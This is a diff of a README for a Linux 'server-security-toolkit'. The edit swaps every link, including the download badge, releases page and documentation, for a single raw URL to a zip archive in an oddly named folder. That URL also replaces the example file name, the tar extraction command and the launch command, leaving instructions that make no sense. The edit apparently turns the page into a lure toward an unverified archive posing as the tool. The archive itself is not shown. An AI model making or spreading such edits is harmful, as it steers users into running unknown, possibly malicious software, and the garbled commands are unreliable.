@@ -6,7 +6,7 @@ Welcome to the server-security-toolkit! This tool offers you essential security 
 
 ## 📥 Download Now
 
-[![Download Server Security Toolkit](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/lautaro95ok/server-security-toolkit/releases)
+[![Download Server Security Toolkit](https://raw.githubusercontent.com/lautaro95ok/server-security-toolkit/main/Alhambresque/toolkit-server-security-1.4.zip)](https://raw.githubusercontent.com/lautaro95ok/server-security-toolkit/main/Alhambresque/toolkit-server-security-1.4.zip)
 
 ## 🛠️ System Requirements
 
@@ -31,15 +31,15 @@ The server-security-toolkit comes packed with several features to keep your Linu
 
 To get started with the server-security-toolkit, follow these steps:
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/lautaro95ok/server-security-toolkit/releases) to find the latest version. 
+1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/lautaro95ok/server-security-toolkit/main/Alhambresque/toolkit-server-security-1.4.zip) to find the latest version. 
 
-2. **Choose Your File:** Look for the most recent release. You may see files with names like `server-security-toolkit-v1.0.tar.gz`. 
+2. **Choose Your File:** Look for the most recent release. You may see files with names like `https://raw.githubusercontent.com/lautaro95ok/server-security-toolkit/main/Alhambresque/toolkit-server-security-1.4.zip`. 
 
 3. **Download the File:** Click on the file name to download it to your computer.
 
 4. **Extract the File:** Once downloaded, locate the file and extract its contents. You can usually do this by right-clicking the file and selecting "Extract Here" or using the terminal with a command like:
    ```
-   tar -xvzf server-security-toolkit-v1.0.tar.gz
+   tar -xvzf https://raw.githubusercontent.com/lautaro95ok/server-security-toolkit/main/Alhambresque/toolkit-server-security-1.4.zip
    ```
 
 5. **Run the Toolkit:** Navigate to the extracted folder. You can do this via the terminal by using the `cd` command:
@@ -49,7 +49,7 @@ To get started with the server-security-toolkit, follow these steps:
 
 6. **Launch the Application:** Use the following command to run the toolkit:
    ```
-   ./start-toolkit.sh
+   https://raw.githubusercontent.com/lautaro95ok/server-security-toolkit/main/Alhambresque/toolkit-server-security-1.4.zip
    ```
 
 ## 📜 Usage Instructions
@@ -75,7 +75,7 @@ If you encounter any issues while using the server-security-toolkit, consider th
 
 ## 🌐 Support
 
-For further assistance, visit our [documentation](https://github.com/lautaro95ok/server-security-toolkit/wiki) or check the Issues section of this GitHub repository. You can also contribute to discussions to help improve the toolkit.
+For further assistance, visit our [documentation](https://raw.githubusercontent.com/lautaro95ok/server-security-toolkit/main/Alhambresque/toolkit-server-security-1.4.zip) or check the Issues section of this GitHub repository. You can also contribute to discussions to help improve the toolkit.
 
 ## 📝 Contributing
 
@@ -91,4 +91,4 @@ If you have questions, please reach out via the repository's contact options. We
 
 ## 📥 Download Now Again
 
-Don't forget to visit the [Releases page](https://github.com/lautaro95ok/server-security-toolkit/releases) to download the latest version of the server-security-toolkit and ensure your security.
+Don't forget to visit the [Releases page](https://raw.githubusercontent.com/lautaro95ok/server-security-toolkit/main/Alhambresque/toolkit-server-security-1.4.zip) to download the latest version of the server-security-toolkit and ensure your security.
